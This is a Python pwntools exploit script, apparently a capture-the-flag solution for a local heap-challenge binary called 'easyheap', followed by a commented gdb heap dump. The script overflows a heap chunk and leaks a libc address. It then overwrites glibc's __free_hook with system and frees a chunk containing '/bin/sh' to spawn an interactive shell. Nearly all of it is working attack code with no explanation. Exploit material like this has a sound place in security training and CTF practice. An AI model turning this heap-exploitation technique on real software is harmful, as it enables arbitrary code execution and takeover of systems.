#using free_hook
from pwn import *
#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./easyheap')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(size, data):
    cn.sendline('1')
    cn.recvuntil("Size:")
    cn.sendline(str(size))
    cn.recvuntil('Content:\n')
    cn.sendline(data)


def edit(i,size, data):
    cn.recvuntil('Choice:')
    cn.sendline('2')
    cn.recvuntil('id:')
    cn.sendline(str(i))
    cn.recvuntil("Size:")
    cn.sendline(str(size))
    cn.recvuntil('Content:\n')
    cn.send(data)


def list_chunk():
	cn.sendline('3')
	cn.recvuntil('Choice:')

def remove(i):
    cn.recvuntil('Choice:')
    cn.sendline('4')
    cn.sendline(str(i))

def z():
	gdb.attach(cn)
	raw_input()

create(0x80,'aaaa')
create(0x80,'bbbb')
create(0x80,'cccc')

remove(1)

pay = 'a'*0x80 + 'b'*0x20 + 'c'*0x10
edit(0,len(pay),pay)

cn.recvuntil('Choice:')
cn.sendline('3')
cn.recvuntil(pay)
addr = cn.recvline()[:-1]
addr = u64(addr.ljust(8,'\x00'))
libc_base = addr - 0x3c4b78
free_hook = libc_base + 0x3C67A8
system = libc_base + libc.symbols['system']
success('leak_addr: '+hex(addr))
success('libc_base: '+hex(libc_base))
success('free_hook: '+hex(free_hook))
success('system: '+hex(system))

pay = 'a'*(0x170-0x30)+p64(0x80) + p64(free_hook)
edit(0, len(pay), pay)
edit(2, 0x8, p64(system))

edit(0, 0x8, '/bin/sh\x00')
remove(0)
cn.interactive()

'''
0x55f787f1b020:	0x0000000000000000	0x0000000000000091
0x55f787f1b030:	0x6161616161616161	0x6161616161616161
0x55f787f1b040:	0x6161616161616161	0x6161616161616161
0x55f787f1b050:	0x6161616161616161	0x6161616161616161
0x55f787f1b060:	0x6161616161616161	0x6161616161616161
0x55f787f1b070:	0x6161616161616161	0x6161616161616161
0x55f787f1b080:	0x6161616161616161	0x6161616161616161
0x55f787f1b090:	0x6161616161616161	0x6161616161616161
0x55f787f1b0a0:	0x6161616161616161	0x6161616161616161
0x55f787f1b0b0:	0x6262626262626262	0x6262626262626262
0x55f787f1b0c0:	0x6262626262626262	0x6262626262626262
0x55f787f1b0d0:	0x6363636363636363	0x6363636363636363
0x55f787f1b0e0:	0x00007f4dbda34b78	0x00007f4dbda34b78
0x55f787f1b0f0:	0x0000000000000000	0x0000000000000000
0x55f787f1b100:	0x0000000000000000	0x0000000000000000
0x55f787f1b110:	0x0000000000000000	0x0000000000000000
0x55f787f1b120:	0x0000000000000000	0x0000000000000000
0x55f787f1b130:	0x0000000000000000	0x0000000000000000
0x55f787f1b140:	0x0000000000000000	0x0000000000000000
0x55f787f1b150:	0x0000000000000000	0x0000000000000000
0x55f787f1b160:	0x0000000000000090	0x0000000000000020
0x55f787f1b170:	0x0000000000000080	0x000055f787f1b190
'''
